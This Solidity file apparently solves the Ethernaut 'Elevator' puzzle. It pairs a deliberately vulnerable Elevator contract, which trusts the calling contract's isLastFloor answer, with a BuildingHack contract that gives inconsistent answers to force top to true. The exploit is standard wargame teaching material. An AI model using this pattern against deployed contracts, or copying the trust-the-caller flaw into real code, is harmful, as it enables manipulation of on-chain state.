// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract BuildingHack {
    uint public count = 0;
    uint public floor = 10;
    Elevator public curElevator;

    constructor(address payable ElevatorAdr)  {
        curElevator = Elevator(ElevatorAdr);
    }

    function isLastFloor(uint _floor) external returns (bool){
        if (count == 0) {
            count++;
            return false;
        } else {
            count--;
            return true;
        }
    }

    function callGoTo() public {
        curElevator.goTo(floor);
    }
}